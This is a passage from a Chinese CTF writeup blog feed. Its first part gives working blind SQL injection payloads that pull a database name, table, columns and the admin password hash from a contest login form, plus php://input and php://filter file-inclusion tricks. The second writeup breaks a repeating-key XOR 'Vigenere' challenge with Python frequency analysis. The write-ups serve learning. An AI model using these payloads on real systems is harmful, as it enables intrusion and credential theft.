<code>http://04c432a12784d2fb5ef431ec3366bc9a.yogeit.com:8080/?bdctf=foo&amp;flag=php://input</code> 同时post <code>foo</code> 得到<code>bdctf{UCCdlsZyVe}</code> 。</p><h4 id="火星撞地球"><a href="#火星撞地球" class="headerlink" title="火星撞地球"></a>火星撞地球</h4><blockquote><p>flag{1q2w3e4r}<br>密码就是答案，格式flag{xxxx}<br><a href="http://eef6f0186546043da56bf4c7f7e6d3ca.yogeit.com:8080" target="_blank" rel="external">http://eef6f0186546043da56bf4c7f7e6d3ca.yogeit.com:8080</a></p></blockquote><p>获取当前数据库名member</p><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">name=admin%27%20and%20(ASCII(MID((database()),6,1)))=114%23&amp;password=%27%20or%201&amp;submit2=%E4%BC%9A%E5%91%98%E7%99%BB%E5%BD%95</div></pre></td></tr></table></figure><p>当前数据库只有一个表</p><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">name=admin%27%20and%20(ASCII(MID((select%20count(table_name)%20from%20information_schema.tables%20where%20table_schema=database()),1,1)))=49%23&amp;password=%27%20or%201&amp;submit2=%E4%BC%9A%E5%91%98%E7%99%BB%E5%BD%95</div></pre></td></tr></table></figure><p>当前表名为member</p><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">name=admin%27%20and%20(ASCII(MID((select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1),7,1)))&gt;0%23&amp;password=%27%20or%201&amp;submit2=%E4%BC%9A%E5%91%98%E7%99%BB%E5%BD%95</div></pre></td></tr></table></figure><p>当前表有四条记录</p><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">name=admin%27%20and%20(ASCII(MID((select%20count(*)%20from%20member),1,1)))=52%23&amp;password=%27%20or%201&amp;submit2=%E4%BC%9A%E5%91%98%E7%99%BB%E5%BD%95</div></pre></td></tr></table></figure><p>得到列名’id,member_user,member_password,member_name，。。。’</p><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">name=admin%27%20and%20(ASCII(MID((select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema=&apos;member&apos;),44,1)))&gt;44%23&amp;password=%27%20or%201&amp;submit2=%E4%BC%9A%E5%91%98%E7%99%BB%E5%BD%95</div></pre></td></tr></table></figure><p>查询密码字段 burp爆破得到’5416d7cd6ef195a0f7622a9c56b55e84’，即’1q2w3e4r’。</p><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">name=admin%27%20and%20(ASCII(MID((select%20member_password%20from%20member%20where%20member_user=&apos;admin&apos;),1,1)))=53%23&amp;password=%27%20or%201&amp;submit2=%E4%BC%9A%E5%91%98%E7%99%BB%E5%BD%95</div></pre></td></tr></table></figure><p>最后flag为<code>flag{1q2w3e4r}</code> </p><h4 id="密室杀人案-x"><a href="#密室杀人案-x" class="headerlink" title="密室杀人案[x]"></a>密室杀人案[x]</h4><blockquote><p>格式bdctf{xxxx}<br><a href="http://417c9d88ead6809efb1d310fe6832f56.yogeit.com:8080" target="_blank" rel="external">http://417c9d88ead6809efb1d310fe6832f56.yogeit.com:8080</a></p></blockquote><figure class="highlight html"><table><tr><td class="code"><pre><div class="line">bdctf--密室谋杀案</div><div class="line">这是一场发生在PHP序列化密室里面的谋杀案，今日这里发生了一起密室谋杀案，有一个名叫flag的人被杀害。案发现场发生在这个家里面，然而flag他的尸体被嫌疑人藏匿了起来,无法获得更多被害人的信息。 作案的嫌疑人在这个屋子里面，在这屋子里面的人有三兄弟和一个侦探 ，三兄弟中老大Ford权威最高，其他兄弟都在它的保护下生活,因为三兄弟的勤劳勇敢也经常被其他人调去工作任劳任怨。二哥Walker性格生性好动，喜欢结交朋友也经常找老三帮忙。 老三David为人老实憨厚，和二哥关系最好却有一天因为某件事情离开了这个家,成立了另外一个家。还有就是侦探，侦探wesley他案发当天也在现场，他似乎知道些什么但似乎迫于某种压力没有说出凶手是谁。 只要你收集足够多三兄弟的信息给wesley，相信他会说出真相。</div></pre></td></tr></table></figure><h4 id="bluedon用户-x"><a href="#bluedon用户-x" class="headerlink" title="bluedon用户[x]"></a>bluedon用户[x]</h4><blockquote><p>格式，bdctf{xxxxx}<br><a href="http://11537c131de3f8b2060b36c0cf7eb083.yogeit.com:8080" target="_blank" rel="external">http://11537c131de3f8b2060b36c0cf7eb083.yogeit.com:8080</a></p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><div class="line"><span class="comment">//index.php</span></div><div class="line">you are not bluedon ! </div><div class="line">&lt;!--</div><div class="line">$user = $_GET[<span class="string">"user"</span>];</div><div class="line">$file = $_GET[<span class="string">"file"</span>];</div><div class="line">$pass = $_GET[<span class="string">"pass"</span>];</div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"the user is bluedon"</span>))&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"hello bluedon!&lt;br&gt;"</span>;</div><div class="line">    <span class="keyword">include</span>($file); <span class="comment">//class.php</span></div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"you are not bluedon ! "</span>;</div><div class="line">&#125;</div><div class="line"> --&gt;</div><div class="line">   </div><div class="line"><span class="comment">//class.php</span></div><div class="line"><span class="comment">//view-source:http://11537c131de3f8b2060b36c0cf7eb083.yogeit.com:8080/?file=php://filter/convert.base64-encode/resource=class.php&amp;user=php://input</span></div><div class="line"></div><div class="line">the user is bluedon</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span>&#123;<span class="comment">//f1a9.php</span></div><div class="line">    <span class="keyword">public</span> $file;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</div><div class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);    </div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> <span class="string">"恭喜get flag"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      ┏ (゜ω゜)=☞  滑稽树上滑稽果
    
    </summary>
    
      <category term="writeup" scheme="https://findneo.github.io/categories/writeup/"/>
    
    
      <category term="ctf" scheme="https://findneo.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>南邮CTF平台 Vigenere writeup</title>
    <link href="https://findneo.github.io/2017/10/nupt-vigenere/"/>
    <id>https://findneo.github.io/2017/10/nupt-vigenere/</id>
    <published>2017-10-05T11:40:09.000Z</published>
    <updated>2017-11-25T15:21:45.191Z</updated>
    
    <content type="html"><![CDATA[<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><blockquote><p> It is said that Vigenere cipher does not achieve the perfect secrecy actually :-)</p><p> Tips:<br> 1.The encode pragram is given;<br> 2.Do u no <a href="https://en.wikipedia.org/wiki/Index_of_coincidence" target="_blank" rel="external">index of coincidence </a>？<br> 3.The key is last 6 words of the plain text(with “nctf{}” when submitted, also without any interpunction)</p><p> <a href="http://ctf.nuptsast.com/static/uploads/13706e3281c1fb0c04417d3452cb745b/encode.cpp" target="_blank" rel="external">encode.cpp</a>   <a href="http://ctf.nuptsast.com/static/uploads/9a27a6c8b9fb7b8d2a07ad94924c02e5/code.txt" target="_blank" rel="external">code.txt</a> </p></blockquote><h3 id="什么是异或"><a href="#什么是异或" class="headerlink" title="什么是异或"></a>什么是异或</h3><p>异或（exclusive or）是二元逻辑运算符，符号为 XOR 或 EOR 或 ⊕或 ^ 。对于表达式 <code>a^b</code> 的取值，当且仅当a、b逻辑值不同时为真。具体来说就是四个式子：<code>1^1=0;    0^0=0;    1^0=1;    0^1=1</code> 。另外，异或有一些基本的特性，<strong>本题仅用到第七行的特性</strong>即可。</p><figure class="highlight php"><table><tr><td class="code"><pre><div class="line">a^a=<span class="number">0</span>;</div><div class="line">a^<span class="number">0</span>=a;</div><div class="line">a^b=b^a;</div><div class="line">a^(b^c)=(a^b)^c;</div><div class="line">a^b^b=a;</div><div class="line">------------------------------------------</div><div class="line">如果 cipher = plain ^ key，那么 plain = cipher ^ key</div><div class="line">简单地证明一下：</div><div class="line">        c = p ^ k</div><div class="line"> --&gt;  c ^ k = p ^ k ^ k</div><div class="line"> --&gt;  c ^ k = p</div><div class="line">------------------------------------------</div><div class="line">一个以字节为单位进行异或的例子：</div><div class="line">  <span class="number">97</span>^<span class="number">98</span>--&gt; <span class="number">01100001</span> ^ <span class="number">01100010</span> = <span class="number">00000011</span> -&gt; <span class="number">3</span></div></pre></td></tr></table></figure><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>我们知道，英文中的每个字母使用频率是不同的，在够长的一段话里，各个字母的占比大致稳定，并且这个稳定值也已经用巨大的语料库统计出来了，这就是<a href="https://zh.wikipedia.org/wiki/%E5%AD%97%E6%AF%8D%E9%A2%91%E7%8E%87" target="_blank" rel="external">字母频率</a>。这种统计层面的现象，就给我们提供了判断一段文字是否可能有意义的依据，并且这种判断可以通过编程轻松完成。然而，给定两个字母组合，只计算出其中各字母的占比是不够的，想要准确高效地比较两段文字谁更可能具备有意义的语义，我们最好算出一个归一化参数，用以直观表示可能性的大小，这就是文中提到的 <a href="https://en.wikipedia.org/wiki/Index_of_coincidence#Example" target="_blank" rel="external">correlation</a>  ，计算公式也是有的，<img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/1b77b0ca8571bb219a9ad2ddf00b982d983d17d3" alt="\mathbf{\chi} = \sum_{i=1}^{c}n_i f_i">  ，其中n(i)指字母i在一段话的所有字母中所占的比例，f(i)就是已经统计出来的i字母的频率，具体如下所示。</p><p>字母频率列表：</p><figure class="highlight php"><table><tr><td class="code"><pre><div class="line">frequencies = &#123;<span class="string">"e"</span>: <span class="number">0.12702</span>, <span class="string">"t"</span>: <span class="number">0.09056</span>, <span class="string">"a"</span>: <span class="number">0.08167</span>, <span class="string">"o"</span>: <span class="number">0.07507</span>, <span class="string">"i"</span>: <span class="number">0.06966</span>,</div><div class="line">               <span class="string">"n"</span>: <span class="number">0.06749</span>, <span class="string">"s"</span>: <span class="number">0.06327</span>, <span class="string">"h"</span>: <span class="number">0.06094</span>, <span class="string">"r"</span>: <span class="number">0.05987</span>, <span class="string">"d"</span>: <span class="number">0.04253</span>,</div><div class="line">               <span class="string">"l"</span>: <span class="number">0.04025</span>, <span class="string">"c"</span>: <span class="number">0.02782</span>, <span class="string">"u"</span>: <span class="number">0.02758</span>, <span class="string">"m"</span>: <span class="number">0.02406</span>, <span class="string">"w"</span>: <span class="number">0.02360</span>,</div><div class="line">               <span class="string">"f"</span>: <span class="number">0.02228</span>, <span class="string">"g"</span>: <span class="number">0.02015</span>, <span class="string">"y"</span>: <span class="number">0.01974</span>, <span class="string">"p"</span>: <span class="number">0.01929</span>, <span class="string">"b"</span>: <span class="number">0.01492</span>,</div><div class="line">               <span class="string">"v"</span>: <span class="number">0.00978</span>, <span class="string">"k"</span>: <span class="number">0.00772</span>, <span class="string">"j"</span>: <span class="number">0.00153</span>, <span class="string">"x"</span>: <span class="number">0.00150</span>, <span class="string">"q"</span>: <span class="number">0.00095</span>,</div><div class="line">               <span class="string">"z"</span>: <span class="number">0.00074</span>&#125;</div></pre></td></tr></table></figure><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><h4 id="理解加密"><a href="#理解加密" class="headerlink" title="理解加密"></a>理解加密</h4><p>题目的加密方式大致等价于这样写：</p><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># coding:utf8</span></div><div class="line">key = [<span class="number">0xba</span>, <span class="number">0x1f</span>, <span class="number">0x91</span>, <span class="number">0xb2</span>, <span class="number">0x53</span>, <span class="number">0xcd</span>, <span class="number">0x3e</span>]  <span class="comment"># 长度范围是1-13，当然，我们还不知道key是多少</span></div><div class="line">plain = open(<span class="string">'ptext.txt'</span>).read()</div><div class="line">cipher = open(<span class="string">'ctext.txt'</span>, <span class="string">'w+'</span>)</div><div class="line">c = <span class="string">''</span></div><div class="line">k = <span class="number">0</span></div><div class="line"><span class="keyword">for</span> p <span class="keyword">in</span> plain:</div><div class="line">    c += hex(ord(p) ^ key[k])[<span class="number">2</span>:].zfill(<span class="number">2</span>)</div><div class="line">    k = (k + <span class="number">1</span>) % len(key)</div><div class="line">cipher.write(c)</div></pre></td></tr></table></figure><p>程序意思是将明文和密钥逐字节异或，每次异或后的值用两位十六进制表示写入文件，也就是我们见到的code.txt，在这个过程中，密钥是循环使用的。</p><p>那么现在情况是这样的，我们知道：</p><blockquote><p> 密钥的长度区间为1-13字节</p><p> 加密方式为逐字节循环异或 </p><p> 加密结果，即密文的完整内容</p></blockquote><p>我们想知道</p><blockquote><p>明文内容 </p><p>密钥内容</p></blockquote><p>(⊙﹏⊙) 这看起来有点困难。</p><p>不过，其实还有两个不言而喻但非常重要的信息</p><blockquote><p>明文的每一个字节都是可见字符。</p><p>明文是一段有意义的话。</p></blockquote><h4 id="解密代码主程序"><a href="#解密代码主程序" class="headerlink" title="解密代码主程序"></a>解密代码主程序</h4><p>先放个主程序，和下面的对照着看。全部代码在<a href="#解密代码全文">文章底部</a> 。</p><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    ps = []</div><div class="line">    ks = []</div><div class="line">    ss = []</div><div class="line">    ps.extend(xrange(<span class="number">32</span>, <span class="number">127</span>))</div><div class="line">    ks.extend(xrange(<span class="number">0xff</span> + <span class="number">1</span>))</div><div class="line">    ss.extend(xrange(<span class="number">1</span>, <span class="number">14</span>))</div><div class="line">    cipher = getCipher()</div><div class="line"></div><div class="line">    keyPool = getKeyPool(cipher=cipher, stepSet=ss, plainSet=ps, keySet=ks)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> keyPool:</div><div class="line">        freq = getFrequency(cipher, keyPool[i])</div><div class="line">        key = analyseFrequency(freq)</div><div class="line">        plain = vigenereDecrypt(cipher, key)</div><div class="line">        <span class="keyword">print</span> key, plain</div></pre></td></tr></table></figure><h4 id="确定密钥的长度和候选字符集"><a href="#确定密钥的长度和候选字符集" class="headerlink" title="确定密钥的长度和候选字符集"></a>确定密钥的长度和候选字符集</h4><p>明文由可见字符组成。这意味着任何一个使明文出现不可见字符的值都不可能出现在key里。<br>依据此可以取得两个进展。</p><ol><li>求出key的每一个字节有哪些候选字符。<br>具体操作：<br>当我们假设某一字节的key的值时，就可以使用前文提到的plain = cipher ^ key 求出这一字节密文对应的明文，如果这个明文是不可见的，那么我们假设的这个值就不可能出现在key的这个字节。<br>因为是循环异或，所以每个字节的key会去加密多个字节的明文，我们就可以如法炮制，大大缩小key的每个字节的候选字符集。</li><li>在1的基础上，确定key可能有哪几种长度。<br>具体操作：<br>我们假设key每一种可能的长度，一一去求对应的候选字符集， 如果有一种长度的key在某一字节的候选字符集为空，那么key就不可能是这个长度。</li></ol><p>至此，我们可以从无到有求得  <strong>key有哪些可能的长度</strong> 以及  <strong>key在每一种长度下对应的每个字节的候选字符集 </strong>。</p><p>上代码：</p><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getKeyPool</span><span class="params">(cipher, stepSet, plainSet, keySet)</span>:</span></div><div class="line">    <span class="string">''' 传入的密文串、明文字符集、密钥字符集、密钥长度范围均作为数字列表处理.形如[0x11,0x22,0x33]</span></div><div class="line"><span class="string">        返回一个字典，以可能的密钥长度为键，以对应的每一字节的密钥字符集构成的列表为值，</span></div><div class="line"><span class="string">        密钥字符集为数字列表。</span></div><div class="line"><span class="string">            形如&#123;</span></div><div class="line"><span class="string">                    1:[[0x11]],</span></div><div class="line"><span class="string">                    3:[</span></div><div class="line"><span class="string">                        [0x11,0x33,0x46],</span></div><div class="line"><span class="string">                        [0x22,0x58],</span></div><div class="line"><span class="string">                        [0x33]</span></div><div class="line"><span class="string">                       ]</span></div><div class="line"><span class="string">                &#125;</span></div><div class="line"><span class="string">    '''</span></div><div class="line">    keyPool = dict()</div><div class="line">    <span class="keyword">for</span> step <span class="keyword">in</span> stepSet:</div><div class="line">        maybe = [<span class="keyword">None</span>] * step</div><div class="line">        <span class="keyword">for</span> pos <span class="keyword">in</span> xrange(step):</div><div class="line">            maybe[pos] = []</div><div class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> keySet:</div><div class="line">                flag = <span class="number">1</span></div><div class="line">                <span class="keyword">for</span> c <span class="keyword">in</span> cipher[pos::step]:</div><div class="line">                    <span class="keyword">if</span> c ^ k <span class="keyword">not</span> <span class="keyword">in</span> plainSet:</div><div class="line">                        flag = <span class="number">0</span></div><div class="line">                <span class="keyword">if</span> flag:</div><div class="line">                    maybe[pos].append(k)</div><div class="line">        <span class="keyword">for</span> posPool <span class="keyword">in</span> maybe:</div><div class="line">            <span class="keyword">if</span> len(posPool) == <span class="number">0</span>:</div><div class="line">                maybe = []</div><div class="line">                <span class="keyword">break</span></div><div class="line">        <span class="keyword">if</span> len(maybe) != <span class="number">0</span>:</div><div class="line">            keyPool[step] = maybe</div><div class="line">    <span class="keyword">return</span> keyPool</div></pre></td></tr></table></figure><h4 id="遍历候选字符集，求出对应的字频"><a href="#遍历候选字符集，求出对应的字频" class="headerlink" title="遍历候选字符集，求出对应的字频"></a>遍历候选字符集，求出对应的字频</h4><p>这虽是个体力活，却也得小心翼翼。</p><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getFrequency</span><span class="params">(cipher, keyPoolList)</span>:</span></div><div class="line">    <span class="string">''' 传入的密文作为数字列表处理</span></div><div class="line"><span class="string">        传入密钥的字符集应为列表，依次包含各字节字符集。</span></div><div class="line"><span class="string">            形如[[0x11,0x12],[0x22]]</span></div><div class="line"><span class="string">        返回字频列表，依次为各字节字符集中每一字符作为密钥组成部分时对应的明文字频</span></div><div class="line"><span class="string">            形如[&#123;</span></div><div class="line"><span class="string">                    0x11:&#123;'a':2,'b':3&#125;,</span></div><div class="line"><span class="string">                    0x12:&#123;'e':6&#125;</span></div><div class="line"><span class="string">                 &#125;,</span></div><div class="line"><span class="string">                 &#123;</span></div><div class="line"><span class="string">                    0x22:&#123;'g':1&#125;</span></div><div class="line"><span class="string">                 &#125;]</span></div><div class="line"><span class="string">    '''</span></div><div class="line">    freqList = []</div><div class="line">    keyLen = len(keyPoolList)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(keyLen):</div><div class="line">        posFreq = dict()</div><div class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> keyPoolList[i]:</div><div class="line">            posFreq[k] = dict()</div><div class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> cipher[i::keyLen]:</div><div class="line">                p = chr(k ^ c)</div><div class="line">                posFreq[k][p] = posFreq[k][p] + <span class="number">1</span> <span class="keyword">if</span> p <span class="keyword">in</span> posFreq[k] <span class="keyword">else</span> <span class="number">1</span></div><div class="line">        freqList.append(posFreq)</div><div class="line">    <span class="keyword">return</span> freqList</div></pre></td></tr></table></figure><h4 id="根据字频求得密钥"><a href="#根据字频求得密钥" class="headerlink" title="根据字频求得密钥"></a>根据字频求得密钥</h4><p>明文是一段有意义的话。这意味着它算出来的correlation值一定是所有候选明文中最大的，依照这一点就能挑出密钥每个字节的值，从而得到整个密钥。这也是整个解密过程最核心的一部分。</p><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">calCorrelation</span><span class="params">(cpool)</span>:</span></div><div class="line">    <span class="string">'''传入字典，形如&#123;'e':2,'p':3&#125;</span></div><div class="line"><span class="string">        返回可能性，0~1,值越大可能性越大</span></div><div class="line"><span class="string">        (correlation between the decrypted column letter frequencies and</span></div><div class="line"><span class="string">        the relative letter frequencies for normal English text)</span></div><div class="line"><span class="string">    '''</span></div><div class="line">    frequencies = &#123;<span class="string">"e"</span>: <span class="number">0.12702</span>, <span class="string">"t"</span>: <span class="number">0.09056</span>, <span class="string">"a"</span>: <span class="number">0.08167</span>, <span class="string">"o"</span>: <span class="number">0.07507</span>, <span class="string">"i"</span>: <span class="number">0.06966</span>,</div><div class="line">                   <span class="string">"n"</span>: <span class="number">0.06749</span>, <span class="string">"s"</span>: <span class="number">0.06327</span>, <span class="string">"h"</span>: <span class="number">0.06094</span>, <span class="string">"r"</span>: <span class="number">0.05987</span>, <span class="string">"d"</span>: <span class="number">0.04253</span>,</div><div class="line">                   <span class="string">"l"</span>: <span class="number">0.04025</span>, <span class="string">"c"</span>: <span class="number">0.02782</span>, <span class="string">"u"</span>: <span class="number">0.02758</span>, <span class="string">"m"</span>: <span class="number">0.02406</span>, <span class="string">"w"</span>: <span class="number">0.02360</span>,</div><div class="line">                   <span class="string">"f"</span>: <span class="number">0.02228</span>, <span class="string">"g"</span>: <span class="number">0.02015</span>, <span class="string">"y"</span>: <span class="number">0.01974</span>, <span class="string">"p"</span>: <span class="number">0.01929</span>, <span class="string">"b"</span>: <span class="number">0.01492</span>,</div><div class="line">                   <span class="string">"v"</span>: <span class="number">0.00978</span>, <span class="string">"k"</span>: <span class="number">0.00772</span>, <span class="string">"j"</span>: <span class="number">0.00153</span>, <span class="string">"x"</span>: <span class="number">0.00150</span>, <span class="string">"q"</span>: <span class="number">0.00095</span>,</div><div class="line">                   <span class="string">"z"</span>: <span class="number">0.00074</span>&#125;</div><div class="line">    relative = <span class="number">0.0</span></div><div class="line">    total = <span class="number">0</span></div><div class="line">    fpool = <span class="string">'etaoinshrdlcumwfgypbvkjxqz'</span></div><div class="line">    total = sum(cpool.values())  <span class="comment"># 总和应包括字母和其他可见字符</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cpool.keys():</div><div class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> fpool:</div><div class="line">            relative += frequencies[i] * cpool[i] / total</div><div class="line">    <span class="keyword">return</span> relative</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">analyseFrequency</span><span class="params">(cfreq)</span>:</span></div><div class="line">    key = []</div><div class="line">    <span class="keyword">for</span> posFreq <span class="keyword">in</span> cfreq:</div><div class="line">        mostRelative = <span class="number">0</span></div><div class="line">        <span class="keyword">for</span> keyChr <span class="keyword">in</span> posFreq.keys():</div><div class="line">            r = calCorrelation(posFreq[keyChr])</div><div class="line">            <span class="keyword">if</span> r &gt; mostRelative:</div><div class="line">                mostRelative = r</div><div class="line">                keychar = keyChr</div><div class="line">        key.append(keychar)</div><div class="line"></div><div class="line">    <span class="keyword">return</span> key</div></pre></td></tr></table></figure><h4 id="根据密钥解密"><a href="#根据密钥解密" class="headerlink" title="根据密钥解密"></a>根据密钥解密</h4><p>求出密钥剩下的就好办了。</p><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">vigenereDecrypt</span><span class="params">(cipher, key)</span>:</span></div><div class="line">    plain = <span class="string">''</span></div><div class="line">    cur = <span class="number">0</span></div><div class="line">    ll = len(key)</div><div class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> cipher:</div><div class="line">        plain += chr(c ^ key[cur])</div><div class="line">        cur = (cur + <span class="number">1</span>) % ll</div><div class="line">    <span class="keyword">return</span> plain</div></pre></td></tr></table></figure><h3 id="一些数据"><a href="#一些数据" class="headerlink" title="一些数据"></a>一些数据</h3><h4 id="可能的密钥长度和对应字符集"><a href="#可能的密钥长度和对应字符集" class="headerlink" title="可能的密钥长度和对应字符集"></a>可能的密钥长度和对应字符集</h4><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&#123;7: </div><div class="line">[[162, 165, 168, 169, 170, 174, 175, 178, 179, 180, 184, 185, 186, 187, 189, 190, 191], </div><div class="line"></div><div class="line">[0, 2, 10, 11, 12, 17, 21, 23, 25, 26, 27, 28, 29, 30, 31, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95], </div><div class="line"></div><div class="line">[132, 133, 142, 144, 145, 146, 147, 148, 149, 150, 155, 159, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223], </div><div class="line"></div><div class="line">[161, 166, 167, 170, 173, 176, 177, 178, 179, 180, 181, 182, 183, 186, 188], </div><div class="line"></div><div class="line">[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 68, 70, 72, 76, 78, 80, 81, 82, 83, 84, 86, 87, 90, 93], </div><div class="line"></div><div class="line">[128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 195, 196, 200, 201, 202, 204, 205, 206, 207, 208, 210, 213, 216, 217, 223], </div><div class="line"></div><div class="line">[33, 39, 43, 44, 52, 55, 57, 58, 59, 60, 61, 62, 63]</div><div class="line">]&#125;</div></pre></td></tr></table></figure><h4 id="最后结果"><a href="#最后结果" class="headerlink" title="最后结果"></a>最后结果</h4><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">[186, 31, 145, 178, 83, 205, 62] Cryptography is the practice and study of techniques for, among other things, secure communication in the presence of attackers. Cryptography has been used for hundreds, if not thousands, of years, but traditional cryptosystems were designed and evaluated in a fairly ad hoc manner. For example, the Vigenere encryption scheme was thought to be secure for decades after it was invented, but we now know, and this exercise demonstrates, that it can be broken very easily.</div><div class="line">[Finished in 2.2s]</div></pre></td></tr></table></figure><h3 id="解密代码全文"><a href="#解密代码全文" class="headerlink" title="解密代码全文"></a>解密代码全文</h3><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># coding:utf8</span></div><div class="line"><span class="comment"># by https://findneo.github.io/</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getCipher</span><span class="params">(file=<span class="string">'code.txt'</span>)</span>:</span></div><div class="line">    <span class="string">'''从文件中读取十六进制串，返回十六进制数组</span></div><div class="line"><span class="string">    '''</span></div><div class="line">    c = open(file).read()</div><div class="line">    codeintlist = []</div><div class="line">    codeintlist.extend(</div><div class="line">        (map(<span class="keyword">lambda</span> i: int(c[i:i + <span class="number">2</span>], <span class="number">16</span>), range(<span class="number">0</span>, len(c), <span class="number">2</span>))))</div><div class="line">    <span class="keyword">return</span> codeintlist</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getKeyPool</span><span class="params">(cipher, stepSet, plainSet, keySet)</span>:</span></div><div class="line">    <span class="string">''' 传入的密文串、明文字符集、密钥字符集、密钥长度范围均作为数字列表处理.形如[0x11,0x22,0x33]</span></div><div class="line"><span class="string">        返回一个字典，以可能的密钥长度为键，以对应的每一字节的密钥字符集构成的列表为值，密钥字符集为数字列表。</span></div><div class="line"><span class="string">            形如&#123;</span></div><div class="line"><span class="string">                    1:[[0x11]],</span></div><div class="line"><span class="string">                    3:[</span></div><div class="line"><span class="string">                        [0x11,0x33,0x46],</span></div><div class="line"><span class="string">                        [0x22,0x58],</span></div><div class="line"><span class="string">                        [0x33]</span></div><div class="line"><span class="string">                       ]</span></div><div class="line"><span class="string">                &#125;</span></div><div class="line"><span class="string">    '''</span></div><div class="line">    keyPool = dict()</div><div class="line">    <span class="keyword">for</span> step <span class="keyword">in</span> stepSet:</div><div class="line">        maybe = [<span class="keyword">None</span>] * step</div><div class="line">        <span class="keyword">for</span> pos <span class="keyword">in</span> xrange(step):</div><div class="line">            maybe[pos] = []</div><div class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> keySet:</div><div class="line">                flag = <span class="number">1</span></div><div class="line">                <span class="keyword">for</span> c <span class="keyword">in</span> cipher[pos::step]:</div><div class="line">                    <span class="keyword">if</span> c ^ k <span class="keyword">not</span> <span class="keyword">in</span> plainSet:</div><div class="line">                        flag = <span class="number">0</span></div><div class="line">                <span class="keyword">if</span> flag:</div><div class="line">                    maybe[pos].append(k)</div><div class="line">        <span class="keyword">for</span> posPool <span class="keyword">in</span> maybe:</div><div class="line">            <span class="keyword">if</span> len(posPool) == <span class="number">0</span>:</div><div class="line">                maybe = []</div><div class="line">                <span class="keyword">break</span></div><div class="line">        <span class="keyword">if</span> len(maybe) != <span class="number">0</span>:</div><div class="line">            keyPool[step] = maybe</div><div class="line">    <span class="keyword">return</span> keyPool</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">calCorrelation</span><span class="params">(cpool)</span>:</span></div><div class="line">    <span class="string">'''传入字典，形如&#123;'e':2,'p':3&#125;</span></div><div class="line"><span class="string">        返回可能性，0~1,值越大可能性越大</span></div><div class="line"><span class="string">        (correlation between the decrypted column letter frequencies and</span></div><div class="line"><span class="string">        the relative letter frequencies for normal English text)</span></div><div class="line"><span class="string">    '''</span></div><div class="line">    frequencies = &#123;<span class="string">"e"</span>: <span class="number">0.12702</span>, <span class="string">"t"</span>: <span class="number">0.09056</span>, <span class="string">"a"</span>: <span class="number">0.08167</span>, <span class="string">"o"</span>: <span class="number">0.07507</span>, <span class="string">"i"</span>: <span class="number">0.06966</span>,</div><div class="line">                   <span 